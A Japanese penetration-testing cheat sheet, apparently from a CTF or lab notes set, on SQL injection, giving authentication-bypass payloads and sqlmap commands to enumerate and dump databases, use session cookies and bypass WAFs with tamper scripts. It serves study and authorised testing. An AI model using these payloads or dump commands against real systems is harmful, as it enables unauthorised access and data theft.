# SQLインジェクション（SQLi）

## 概要

WebアプリケーションのフォームやパラメータにSQL文を挿入し、データベースを不正操作する脆弱性。認証バイパス・データ抽出・コード実行につながる。

---

## 着火条件

- ログインフォームがある
- URLパラメータ（`?id=1`, `?search=foo`）でデータを取得するページがある
- エラーメッセージにSQLやデータベースの情報が含まれている

---

## 観点・着眼点

**まず手動で確認する：**
1. 入力フィールドに `'` を入力してエラーが出るか確認
2. エラーの内容からDBの種類（MySQL / MSSQL / PostgreSQL / SQLite）を推測
3. エラーが出なくても「挙動の変化」を観察する（レスポンス内容・サイズの変化）

**認証バイパスの定番：**
```
ユーザー名: admin' --
パスワード: anything

ユーザー名: ' OR '1'='1
パスワード: ' OR '1'='1
```

---

## 手順

### sqlmap による自動検出・抽出

**GETパラメータへの検査：**
```bash
sqlmap -u "http://[TARGET]/page?id=1" --batch
```

**POSTフォームへの検査：**
```bash
sqlmap -u "http://[TARGET]/login" \
  --data="username=admin&password=test" \
  --batch
```

**特定のフォームフィールドを指定：**
```bash
sqlmap -u "http://[TARGET]/login" \
  --data="username=admin&password=test" \
  -p username \
  --batch
```

**データベース・テーブル・データの抽出：**
```bash
# DB一覧
sqlmap -u "[URL]" --dbs --batch

# テーブル一覧
sqlmap -u "[URL]" -D [DB_NAME] --tables --batch

# データ抽出
sqlmap -u "[URL]" -D [DB_NAME] -T [TABLE_NAME] --dump --batch
```

**Cookieが必要な認証済みページへの検査：**
```bash
sqlmap -u "http://[TARGET]/page" \
  --cookie="session=[COOKIE_VALUE]" \
  --batch
```

---

## 注意点・落とし穴

- `--batch` を使うと全質問にデフォルト回答するので自動化しやすいが、重要な選択を見逃す場合がある
- sqlmap のデフォルトはレベル1・リスク1。検出できない場合は `--level=5 --risk=3` を試す
- WAFが存在する場合は `--tamper` オプションでバイパスを試みる
- sqlmap の出力は `--output-dir` で保存しておくと再実行が不要になる

---

## 関連技術
- 認証情報が取得できた → `../Credential_Discovery.md`
- 管理者パネルにアクセスできた → Webアプリ固有の機能を調査
